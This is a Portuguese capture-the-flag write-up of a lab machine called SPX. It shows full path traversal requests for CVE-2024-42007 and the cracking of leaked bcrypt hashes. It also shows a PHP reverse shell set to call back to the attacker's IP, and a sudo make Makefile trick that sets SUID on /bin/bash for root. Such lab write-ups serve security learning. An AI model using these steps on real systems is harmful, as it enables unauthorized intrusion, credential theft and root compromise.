A SPX começou com um login que eu ainda não conseguia passar. A virada veio no phpinfo: uma chave exposta abriu o caminho para ler arquivos, recuperar hashes e voltar ao Tiny File Manager como admin. Depois teve upload, troca para o profiler e um make install que levou ao root. E sim, teve aquele momento de perceber que eu já tinha a senha e podia ter testado antes. Vivendo e aprendendo.

1 · Reconhecimento

Começo procurando em todas as portas TCP. O alvo da minha sessão era 192.168.118.108. A primeira varredura encontra apenas SSH e HTTP.

sudo nmap -p- --min-rate 5000 -Pn 192.168.118.108

Volto às portas encontradas para identificar as versões e executar os scripts padrão. O -Pn pula a descoberta prévia do host; o -p- da primeira etapa cobre todas as portas TCP de 1 a 65535.

sudo nmap -sC -sV -Pn -p 22,80 192.168.118.108
PortaServiçoIdentificação
22/tcpSSHOpenSSH 8.9p1 Ubuntu
80/tcpHTTPApache 2.4.52 / Tiny File Manager

Como ainda não tenho uma credencial para o sistema, começo pela aplicação web.

2 · Login e primeira pesquisa

Aconteceu uma coisa interessante: digitei o IP no navegador e a página não carregou. Depois deixei o endereço explícito com HTTP e porta 80 e funcionou. Anotado: conferir a URL também faz parte da enumeração. A porta 80 já é a padrão do HTTP.

http://192.168.118.108:80/

O login mostra H3K — Tiny File Manager, com referência a CCP Programmers. Olho o código-fonte da página e encontro mais uma confirmação de que se trata do Tiny File Manager.

Na pesquisa, encontro o artigo do Febin sobre execução de código autenticada no Tiny File Manager. Só que esse caminho precisa de acesso administrativo. Ainda não tenho isso, então volto para a enumeração em vez de tentar pular a etapa da credencial.

3 · phpinfo e a chave do PHP-SPX

Continuo procurando caminhos com o Gobuster e encontro phpinfo.php. Ao abrir a página, uma seção chama minha atenção: SPX. O mesmo nome da máquina. Agora temos uma pista boa.

http://192.168.118.108/phpinfo.php

A captura mostra SPX Version 0.4.15, spx.http_enabled=1 e a chave em spx.http_key. Guardo o valor:

a2a90ca2f9f0ea04d267b16fb8e63800

Essa chave é da interface HTTP do PHP-SPX. Ela não é a senha de admin do Tiny File Manager. São componentes diferentes na mesma aplicação PHP.

Pesquisando o PHP-SPX, encontro a CVE-2024-42007 e o relato no repositório do projeto. A falha permite leitura de arquivos por path traversal no parâmetro SPX_UI_URI. O relato usa SPX_KEY=dev como exemplo; no meu lab preciso substituir esse valor pela chave que acabei de encontrar.

4 · Lendo arquivos pelo SPX

No Burp Repeater, adapto a requisição da PoC para o IP da SPX e para a chave correta. Começo por /etc/passwd para validar a leitura.

GET /?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.118.108
Connection: close

Feito isso, o sucesso vem! A resposta traz as contas do sistema, incluindo root e profiler. O campo x não entrega a senha dessas contas; aqui a informação útil é o nome do usuário e sua home.

root:x:0:0:root:/root:/bin/bash
profiler:x:1000:1000::/home/profiler:/bin/bash

Depois uso a mesma requisição para ler arquivos da aplicação. Primeiro verifico /var/www/html/phpinfo.php:

GET /?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2fphpinfo.php HTTP/1.1
Host: 192.168.118.108
Connection: close

Em seguida, troco o caminho para /var/www/html/index.php. Esse era o caminho promissor. Consegui algo!

GET /?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php HTTP/1.1
Host: 192.168.118.108
Connection: close

A leitura pelo SPX devolve o conteúdo do arquivo PHP, em vez de apenas a página de login renderizada. No código encontro os hashes das contas admin e user. A falha de leitura virou a ponte para conseguir a credencial que faltava.

5 · John e acesso administrativo

Os hashes são bcrypt, começando por $2y$10$. Salvo os valores em um arquivo no Kali. Nos blocos abaixo, deixei cada hash com o nome da conta para ficar fácil associar os resultados.

admin:$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
user:$2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi

Com o arquivo salvo como hashes, uso o John e a rockyou:

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --show --format=bcrypt hashes
Conta no Tiny File ManagerSenha recuperada
adminlowprofile
userprofiler

Finalmente, acesso o site como administrador usando admin:lowprofile. No painel, a versão aparece como Tiny File Manager 2.5.3.

6 · Upload e shell como www-data

No painel, clico em Upload e envio a reverse shell PHP do pentestmonkey, salva como monkeyshell.php. Ajusto o endereço de retorno para o IP do meu Kali nesta sessão, 192.168.45.214, e a porta 4444.

$ip = '192.168.45.214';
$port = 4444;

Antes de abrir o arquivo enviado, deixo o listener esperando no Kali:

sudo nc -nlvp 4444

Depois clico no arquivo e em Open, ou acesso diretamente o caminho que aparece na captura:

http://192.168.118.108/monkeyshell.php

Sucesso, estou dentro do sistema alvo! Confirmo www-data e uso Python para abrir uma pseudo-terminal:

python3 -c 'import pty; pty.spawn("/bin/bash")'
id
whoami

O que ficou registrado nesta etapa foi upload e execução do PHP pelo servidor. O artigo que li no começo tratava de um caminho autenticado com detalhes próprios; não precisei reproduzir aquela manipulação de upload para obter esta shell.

7 · Reutilização de senha e usuário profiler

Aqui veio aquele momento: se eu tivesse tentado isso antes… Eu já tinha senhas recuperadas e ainda não tinha testado mudar para o usuário que apareceu em /etc/passwd. Vivendo e aprendendo, mas isso precisa entrar na metodologia.

su profiler

Testo a reutilização das credenciais recuperadas e consigo mudar para profiler. A conta local e a conta web são contextos diferentes; o acesso só fica confirmado depois do teste e da checagem de identidade.

id
whoami
hostname

Vou até a home e leio a flag local:

cd /home/profiler
ls -la
cat local.txt

8 · Makefile, SUID e root

Verifico o que o novo usuário pode executar com sudo:

sudo -l

A regra permite /usr/bin/make install -C /home/profiler/php-spx. O detalhe é que o make vai ler o Makefile desse diretório e executar o alvo install. Consigo preparar a receita ali e fazer esse comando executar com privilégio.

cd /home/profiler/php-spx
vi Makefile

O conteúdo usado no Makefile é este. As linhas de comando abaixo de cada alvo começam com um TAB real, como exigido pela sintaxe padrão do make:

all:
	@echo "Do nothing in all"

install:
	chmod u+s /bin/bash

O alvo all só imprime uma mensagem. O que me interessa é o install, que ativa o bit SUID no Bash. Executo exatamente o comando autorizado:

sudo /usr/bin/make install -C /home/profiler/php-spx
ls -la /bin/bash
/bin/bash -p

O ls mostra /bin/bash pertencendo a root e com o SUID ativo. O -p faz o Bash preservar o privilégio efetivo recebido. Na captura, o id ainda mostra o UID real do profiler, mas o euid=0(root) confirma o privilégio efetivo de root.

whoami
id
cat /root/proof.txt

BOOOM! Root na SPX e prova lida. Pwn3d!

9 · O que levo dessa máquina

O caminho foi phpinfo → chave do PHP-SPX → leitura do index.php → hashes → admin no Tiny File Manager → upload PHP → www-data → profiler → make → Bash SUID → root. A SPX foi uma sequência de informações expostas que foram se encaixando.

  • Não parar no login: a credencial veio de outro componente da aplicação.
  • Ler o código: o index.php exposto mostrou os hashes que faltavam.
  • Testar reutilização: eu já tinha senhas e demorei para tentar a troca de usuário.
  • Entender o comando permitido: o make executa receitas, então o conteúdo do Makefile importa tanto quanto o binário liberado no sudo.

Referências: relato do PHP-SPX, CVE-2024-42007, pesquisa inicial do Febin, GNU make e Bash e o modo privilegiado.
